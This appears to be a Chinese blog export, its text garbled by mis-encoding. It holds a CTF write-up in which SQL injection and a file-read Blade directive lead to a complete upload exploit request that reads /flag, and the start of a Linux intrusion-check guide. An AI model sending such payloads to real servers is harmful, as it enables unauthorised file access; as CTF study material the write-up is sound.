<h2 id="å…¥æ‰‹æºç "><a href="#å…¥æ‰‹æºç " class="headerlink" title="å…¥æ‰‹æºç "></a>å…¥æ‰‹æºç </h2><p>çŸ¥è¯†ç‚¹1ï¼šæŸ¥çœ‹æ˜¯å¦æ˜¯æ¡†æ¶äºŒæ¬¡å¼€å‘<br>æ‹¿åˆ°æºç åé¦–å…ˆçœ‹read.meå‘ç°æ˜¯Laravelï¼Œå¦‚æœæ²¡æœ‰readmeå¯ä»¥å»çœ‹é…ç½®æ–‡ä»¶å’Œä¸€äº›å›¾ç‰‡æ˜¯å¦èƒ½å‘ç°æ˜¯æ¡†æ¶äºŒæ¬¡å¼€å‘è¿˜æ˜¯å‡ºé¢˜äººè‡ªå·±å†™çš„php demoã€‚</p>
<p>çŸ¥è¯†ç‚¹2ï¼šå¿«é€Ÿäº†è§£æ¡†æ¶<br>æˆ‘ä»¬è¿™é‡Œå‘ç°è¿™ä¸ªæºç æ—¶åŸºäºLaravelå¼€å‘çš„ï¼Œè€Œæˆ‘ä¹Ÿæ˜¯ä»æ¥æ²¡ç”¨è¿‡Laravelï¼Œæ‰€ä»¥é©¬ä¸Šå»å­¦ä¹ äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚åå‡ åˆ†é’Ÿï¼Œææ‡‚laravelçš„ç”¨å¤„ã€‚ä¸»è¦é€šè¿‡ç®€ä»‹å’Œå¼€å‘æ‰‹å†Œæ¥è¿›è¡Œå­¦ä¹ ï¼Œåªè¦äº†è§£å¤§æ¦‚å°±è¡Œäº†ã€‚<br>æˆ‘é€šè¿‡é˜…è¯»å®˜æ–¹æ‰‹å†Œç›®å½•å¤§æ¦‚äº†è§£äº†è¿™ä¸ªphpæ¡†æ¶ï¼š<br><a href="https://xueyuanjun.com/laravel-docs-5_6">https://xueyuanjun.com/laravel-docs-5_6</a></p>
<p>çŸ¥è¯†ç‚¹3ï¼šæ¼æ´ç‚¹çš„æŸ¥æ‰¾<br>è¿™æ—¶å€™ä½ éœ€è¦ä¸€ä¸ªåˆ†æå™¨ï¼Œæ¯•ç«Ÿæ‰‹åŠ¨æ¥æå¤ªæ…¢äº†ï¼ŒCTFæ˜¯å¿«è€…çš„ä¸–ç•Œã€‚æˆ‘ç”¨çš„æ˜¯æœ€è€çš„é‚£ç§seayæºä»£ç å®¡è®¡ç³»ç»Ÿï¼Œä¸è¿‡è¿˜æ˜¯æŒºå¥½ç”¨çš„ã€‚<br>æˆ‘é€šè¿‡è¿™ä¸ªå®¡è®¡å·¥å…·å‘ç°ï¼š&#x2F;app&#x2F;Providers&#x2F;AppServiceProvider.php 18è¡Œ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="title class_">\Blade</span>::<span class="title function_ invoke__">directive</span>(<span class="string">&#x27;filedata&#x27;</span>, function(<span class="variable">$expression</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;?php echo file_get_contents(<span class="subst">$expression</span>); ?&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//å°±æ˜¯è¿™é‡Œäº† ä»»æ„æ–‡ä»¶è¯»å– ä½†æ˜¯è¿™ä¸ªä¸œè¥¿æ˜¯å•¥æ—¶å€™è°ƒç”¨æˆ‘ä»¬è¿˜ä¸çŸ¥é“</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çŸ¥è¯†ç‚¹4ï¼šæ¼«é•¿çš„åˆ†æå­¦ä¹ è¿‡ç¨‹<br>é€šè¿‡æ¼æ´ç‚¹å¯çŸ¥æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°æ€ä¹ˆè°ƒç”¨æˆ‘ä»¬ä¸çŸ¥é“ï¼Œè€Œä¸”å¯¹laravelä¹Ÿä¸å¤ªäº†è§£ï¼Œæ‰€ä»¥æˆ‘ä»¬æœç´¢ â€”&gt;  laravel AppServiceProvider boot æ–¹æ³•å¦‚ä½•è°ƒç”¨<br>ç»“æœä¸­æ˜¾ç¤º bootåœ¨registeræ–¹æ³•åè°ƒç”¨ï¼Œä¸ºäº†è§£å†³ä¸€äº›æ³¨å†Œé—®é¢˜ï¼Œåæ­£å¯¹laravelä¹Ÿä¸å¤ªæ‡‚ï¼Œå…ˆè·³è¿‡ï¼Œç›´æ¥æœç´¢ Blade::directivez å‘ç°è¿™ä¸ªBladeæ˜¯æ¨¡æ¿å¼•æ“ï¼Œå®ƒå¯ä»¥è¿›è¡Œæ¨¡æ¿çš„è‡ªå®šä¹‰ï¼ŒBlade::directiveæ˜¯è¿›è¡ŒæŒ‡ä»¤æ³¨å†Œï¼Œé‡Œé¢çš„å‚æ•°å°±æ˜¯æŒ‡ä»¤åç§°ï¼Œå½“bladeæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™å¯¹åº”æŒ‡å®šå¦‚æœå­˜åœ¨å°±ä¼šè¢«è°ƒç”¨ã€‚æ‰€ä»¥è¿™æ—¶å€™æˆ‘æƒ³åˆ°çš„æ˜¯æ¨¡æ¿æ³¨å…¥è°ƒç”¨æŒ‡ä»¤filedataè¿›è¡Œæ–‡ä»¶è¯»å–</p>
<p>ä½†æ˜¯æ— è®ºæ€ä¹ˆæµ‹è¯•éƒ½æ²¡æœ‰æ¨¡æ¿æ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ è¿›è¡Œæ¨¡æ¿æ³¨å…¥ã€‚äºæ˜¯æˆ‘åˆ©ç”¨seayæºç å®¡è®¡ç³»ç»Ÿå¯¹uploadè¿›è¡Œäº†æœç´¢ã€‚å‘ç°&#x2F;routes&#x2F;web.php ç¡®å®æœ‰ä¸€å¤„ä¸Šä¼ ç‚¹ï¼Œä¸è¿‡éœ€è¦key</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user_testpage/&#123;id&#125;&#x27;</span>, <span class="string">&#x27;UserController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Auth</span>::<span class="title function_ invoke__">routes</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/profile&#x27;</span>,<span class="string">&#x27;ProfileController@show&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;profile&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/uploadto_upload&#x27;</span>,<span class="string">&#x27;HomeController@uploads&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/home/uploadss/&#123;key&#125;&#x27;</span>,<span class="string">&#x27;HomeController@uploadss&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>keyæˆ‘æ‰¾äº†å¥½ä¹…æ²¡æœ‰æ‰¾åˆ°ï¼Œäºæ˜¯é‡æ–°å›åˆ°è¿™ä¸ªæ–‡ä»¶ç»§ç»­å®¡æŸ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ–°çš„å‘ç°ã€‚ç»“æœå‘ç°<br>æ–‡ä»¶è¿˜æœ‰ä¸€ä¸ªè·¯å¾„ user_testpage&#x2F;{id}ï¼Œæ„é€ ä¸€ä¸ª user_testpage&#x2F;1 å‘ç°æœ‰å›æ˜¾ï¼Œç«‹é©¬æ„è¯†åˆ°å¯èƒ½æ˜¯sqliæ³¨å…¥ã€‚<br>ç»è¿‡æµ‹è¯•å‘ç°ç¡®å®æ˜¯sqlæ³¨å…¥åœ¨æ•°æ®åº“æŸ¥åˆ°æ‰€æœ‰ç”¨æˆ·å¯†ç ï¼Œå‘ç°keyå°±æ˜¯ç¬¬äºŒä¸ªç”¨æˆ·åNotAllow6171ã€‚<br>ç„¶åæˆ‘ä»¬å®¡æŸ¥ä¸Šä¼ ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadss</span>(<span class="params">Request <span class="variable">$request</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$key</span>!=&lt;in database key&gt;)&#123;<span class="keyword">die</span>(<span class="string">&#x27;sorry!&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">isMethod</span>(<span class="string">&#x27;post&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">               <span class="variable">$originalName</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>(); <span class="comment">//æ–‡ä»¶åŸå</span></span><br><span class="line">               <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();     <span class="comment">//æ‰©å±•å</span></span><br><span class="line">               <span class="variable">$realPath</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();  </span><br><span class="line">               <span class="variable">$type</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientMimeType</span>();</span><br><span class="line">               <span class="variable">$filecheck</span>=<span class="keyword">new</span> <span class="title class_">HomeController</span>();</span><br><span class="line">	        <span class="variable">$filecheck</span>-&gt;<span class="title function_ invoke__">filecheck</span>(<span class="variable">$realPath</span>);</span><br><span class="line">	        <span class="variable">$filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d-H-i-s&#x27;</span>) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">	        <span class="variable">$path</span>=<span class="variable">$file</span> -&gt; <span class="title function_ invoke__">move</span>(<span class="title function_ invoke__">base_path</span>().<span class="string">&#x27;/resources/views/auth/uploads&#x27;</span>,<span class="variable">$originalName</span>);  </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>å®¡è®¡åå‘ç°æ˜¯ä¸Šä¼ åˆ° &#x2F;resources&#x2F;views&#x2F;auth&#x2F;uploads æˆ‘ä»¬å…ˆè¿›å…¥ç›®å½•æŸ¥çœ‹å…¶ä»–phpæ–‡ä»¶å‘ç°ï¼šå‡½æ•°è°ƒç”¨å°±æ˜¯ç›´æ¥    å‡½æ•°å+ï¼ˆâ€œå‚æ•°â€ï¼‰ äºæ˜¯æˆ‘ä»¬æ„é€  @filedata(â€˜&#x2F;flagâ€™) è¿›è¡Œä¸Šä¼ <br>æ„é€ ä¸Šä¼ ï¼Œå‘ç°æœ‰CSRF è¿™ä¸ªCSRFæ€ä¹ˆè¿‡å‘¢ï¼Ÿå†æ¬¡æŸ¥çœ‹routes&#x2F;web.php å‘ç°è¿˜æœ‰å¦ä¸€å¤„ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯åŠŸèƒ½å¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡è¿™ä¸ªä¸Šä¼ ç‚¹è·å¾—tokenæ¥ä¼ªé€ ä¸€ä¸ªä¸Šä¼ æ•°æ®åŒ…ã€‚é‚£ä¹ˆæ•°æ®åŒ…ä¸­åº”è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè‚¯å®šæ˜¯è¦è°ƒç”¨filedata å‡½æ•°çš„ æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿå…¶ä»–é™æ€é¡µé¢</p>
<p>æœ€ç»ˆpayload:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home/uploadss/NotAllow6171</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>119.61.19.212:8085</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>444</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XSRF-TOKEN=eyJpdiI6IitoWjhwMm1ycmNTWFozSmZTTXJwXC9nPT0iLCJ2YWx1ZSI6IkllczhnNEZodldZbllTN0NmZDErR2I1eXF1bU9mV1wvYklManNuUnQ4YzhJcmlWQ09JVXJPXC9JNHZxVU0xRmdCY0RDbWJHelVwYjQyVjdXQ1FHVlFMMlE9PSIsIm1hYyI6IjNmMGUzZTEwYTA2ZDA2MjJjMDg4OTY5NTI4NDJjNTk2YmQ4N2U4NWYxY2E2ZjU3YWEwNTAwODllMzIyYTU4ZjAifQ%3D%3D; laravel_session=eyJpdiI6InRhRzZmenBJSmFLNHhrb0RlUE5OdVE9PSIsInZhbHVlIjoiZ01qK2JpQURoRHgxbFVrcGc4TE9PK2kycGxSTjlNRzkwK21uVDUxa3UyTW5JYXpIcWJaY2pYbXQwNDc0dklkemNjRmR0aFhZcllmTkRvQXpVUlR3d3c9PSIsIm1hYyI6IjAwMjVkODA3YmY5NDU1Y2U5MDMyMWMwMTI1MTcyMmQ1YTU5NWQzMTE0MGMxMzc0ZWM1NDU4YzQ5MWIyZjI5YTgifQ%3D%3D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;_token&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Z7VZ7FXfNzuzETtQrZ7DeAZCFtbkQl9L8e7ptVin</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;files&quot;; filename=&quot;template.blade.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@filedata(<span class="string">&#x27;/flag&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Submit</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFor</span></span></span><br><span class="line"><span class="language-pgsql">mBoundaryvJNe9ABsnjeKGhDN<span class="comment">--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
<h2 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h2><p>1ã€å…ˆææ‡‚æ¡†æ¶ã€æ‰¾åˆ°å±é™©å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ç‚¹ï¼Œç„¶åä¸€æ¡çº¿åˆ†æä¸‹å»ã€‚<br>2ã€é‡åˆ°éš¾ç‚¹ï¼Œå®¡è®¡ä¸ä¸‹å»çš„æ—¶å€™ï¼Œåˆ©ç”¨è¾…åŠ©å·¥å…·ï¼Œå»æŸ¥æ‰¾ä¸€äº›æ•æ„Ÿçš„å‡½æ•° æ¯”å¦‚ login upload cookie sqlè¯­å¥ç­‰ ä¹Ÿå¯ä»¥ç›´æ¥è‡ªåŠ¨å®¡è®¡çœ‹çœ‹æœ‰ä»€ä¹ˆæ€è·¯ã€‚<br>3ã€å®Œå…¨å®¡è®¡æ¸…æ¥šä»£ç é€»è¾‘ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨çš„æ—¶å€™å°±å¤šå»ç™¾åº¦å¯¹åº”å‡½æ•°ï¼Œå¹¶ç™¾åº¦å¯¹åº”æ¡†æ¶çš„æ¼æ´ï¼Œå‚è€ƒåˆ«äººçš„æ€è·¯ã€‚ä»”ç»†æŸ¥çœ‹ä¸€äº›å·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚å¦‚æœè¿˜æ˜¯ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨é‚£å°±æ˜¯æ²¡çœ‹æ‡‚æ¡†æ¶ï¼Œå†å»è·Ÿä¸€è¾¹æ­£å¸¸åŠŸèƒ½çš„æ¡†æ¶æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨çš„ï¼</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„äº‘æœåŠ¡å™¨ï¼ˆlinuxï¼‰å…¥ä¾µæ’æŸ¥</title>
    <url>//posts/%E6%88%91%E7%9A%84%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<h3 id="èµ·æº"><a href="#èµ·æº" class="headerlink" title="èµ·æº"></a>èµ·æº</h3><p>æˆ‘æœ€è¿‘è€æ˜¯æ„Ÿè§‰è‡ªå·±çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸å¤ªå®‰å…¨ï¼Œå› ä¸ºæˆ‘æ˜¯å¯†ç ç™»é™†çš„ï¼Œæ²¡é…ç½®å¯†é’¥ï¼Œæˆ‘æ€»åœ¨ç”²æ–¹çš„ç”µè„‘ä¸Šç™»é™†æˆ‘çš„æœåŠ¡å™¨ï¼Œè™½ç„¶ä¸Šé¢ä¹Ÿæ²¡å•¥æ•æ„Ÿä¸œè¥¿ã€‚ä½†æ˜¯ä»Šå¤©æœ‰ç©ºçš„æ—¶å€™è¿˜æ˜¯æ’æŸ¥äº†ä¸€ä¸‹ï¼Œå› ä¸ºå¿ƒè™šã€‚ç»“æœæ˜¯ä¸ªä¹Œé¾™ï¼Œåªèƒ½è¯´æœ‰äº›ä¸œè¥¿è¿˜æ²¡äº†è§£è¿‡ã€‚ä¸è¿‡è¿™ä¸€è¿‡ç¨‹ä¹Ÿé‡æ–°æ¸©ä¹ äº†ä¸‹æˆ‘è¿™åŸºç¡€çš„ä¸èƒ½å†åŸºç¡€çš„åº”æ€¥å“åº”èƒ½åŠ›ã€‚ğŸ¤­</p>
<span id="more"></span>

<h3 id="ç”¨æˆ·åˆ†æ"><a href="#ç”¨æˆ·åˆ†æ" class="headerlink" title="ç”¨æˆ·åˆ†æ"></a>ç”¨æˆ·åˆ†æ</h3><p><strong>é¦–å…ˆè‚¯å®šæ˜¯çœ‹æœ‰æ²¡æœ‰éæ³•ç”¨æˆ·ï¼Œæœ‰æ²¡æœ‰ç”¨æˆ·æœ‰éæ³•æƒé™</strong><br>é€šè¿‡å¯¹ &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow çš„æŸ¥çœ‹ï¼Œå‘ç°ç”¨æˆ·çš„æƒé™è¿˜æœ‰ç”¨æˆ·å¹¶æ²¡æœ‰æ›´æ”¹</p>
<p>tipsï¼šæˆ‘ä¸€èˆ¬æ›´æ”¹å®Œå¯†ç ä¼šå¤‡ä»½ä¸€ä»½&#x2F;etc&#x2F;passwd ç„¶åæ’æŸ¥çš„æ—¶å€™ç›´æ¥diffè¿›è¡Œæ¯”å¯¹ï¼Œå› ä¸ºç”¨æˆ·å’ŒæœåŠ¡å¾ˆå¤šæœ‰æ—¶å€™æˆ‘è‡ªå·±éƒ½ä¸æ¸…æ¥š.</p>
<p>è‡³äºæ–°äººï¼Œè¿™é‡Œç»™ä¸€ä»½è¿™ä¸¤ä¸ªæ–‡ä»¶çš„è¯¦è§£ï¼š</p>
<p>account:password:UID:GID:GECOS:directory:shell<br>ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åshell æ³¨æ„ï¼šæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸ç™»é™†</p>
<p>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTq wNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0: 99999:7:::<br>ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™ </p>
<p><strong>ä¸€äº›å¸¸ç”¨æ’æŸ¥ç”¨æˆ·çš„å‘½ä»¤</strong><br>lastï¼šè¿™ä¸ªå‘½ä»¤å¯ç”¨äºæŸ¥çœ‹æˆ‘ä»¬ç³»ç»Ÿçš„æˆåŠŸç™»å½•ã€å…³æœºã€é‡å¯ç­‰æƒ…å†µï¼›è¿™ä¸ªå‘½ä»¤å°±æ˜¯å°†&#x2F;var&#x2F;log&#x2F;wtmpæ–‡ä»¶æ ¼å¼åŒ–è¾“å‡ºã€‚<br>lastbï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæŸ¥çœ‹ç™»å½•å¤±è´¥çš„æƒ…å†µï¼›è¿™ä¸ªå‘½ä»¤å°±æ˜¯å°†&#x2F;var&#x2F;log&#x2F;btmpæ–‡ä»¶æ ¼å¼åŒ–è¾“å‡ºã€‚<br>lastlogï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæŸ¥çœ‹ç”¨æˆ·ä¸Šä¸€æ¬¡çš„ç™»å½•æƒ…å†µï¼›è¿™ä¸ªå‘½ä»¤å°±æ˜¯å°†&#x2F;var&#x2F;log&#x2F;lastlogæ–‡ä»¶æ ¼å¼åŒ–è¾“å‡ºã€‚ï¼ˆæœ‰çš„linuxæ²¡æœ‰è¿™ä¸ªå‘½ä»¤ï¼‰<br>whoï¼šè¿™ä¸ªå‘½ä»¤ç”¨æˆ·æŸ¥çœ‹å½“å‰ç™»å½•ç³»ç»Ÿçš„æƒ…å†µï¼›è¿™ä¸ªå‘½ä»¤å°±æ˜¯å°†&#x2F;var&#x2F;log&#x2F;utmpæ–‡ä»¶æ ¼å¼åŒ–è¾“å‡ºã€‚<br>wï¼šä¸whoå‘½ä»¤ä¸€è‡´ã€‚</p>
<p><strong>æƒé™æ’æŸ¥</strong><br>1ã€æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)  [root@localhost ~]# awk -F: â€˜$3&#x3D;&#x3D;0{print $1}â€™ &#x2F;etc&#x2F;passwd<br>2ã€æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯     [root@localhost ~]# awk â€˜&#x2F;$1|$6&#x2F;{print $1}â€™ &#x2F;etc&#x2F;shadow<br>3ã€é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™ [root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v â€œ^#|^$â€ | grep â€œALL&#x3D;(ALL)â€<br>4ã€ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å· usermod -L user ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œ&#x2F;etc&#x2F;shadowç¬¬ äºŒæ ä¸º!å¼€å¤´ userdel user åˆ é™¤userç”¨æˆ· userdel -r user å°†åˆ é™¤userç”¨æˆ·ï¼Œå¹¶ä¸”å°†&#x2F;homeç›®å½•ä¸‹çš„ userç›®å½•ä¸€å¹¶åˆ é™¤</p>
<h3 id="å†å²å‘½ä»¤æŸ¥çœ‹"><a href="#å†å²å‘½ä»¤æŸ¥çœ‹" class="headerlink" title="å†å²å‘½ä»¤æŸ¥çœ‹"></a>å†å²å‘½ä»¤æŸ¥çœ‹</h3><p>1ã€æŸ¥çœ‹rootçš„å†å²å‘½ä»¤ history<br>2ã€æ‰“å¼€ &#x2F;homeå„å¸å·ç›®å½•ä¸‹çš„.bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å² å‘½ä»¤   cat .bash_history &gt;&gt; history.txt<br>3ã€å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼šhistory -c ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ  é™¤.bash_profileæ–‡ä»¶ä¸­çš„è®°å½•ã€‚</p>
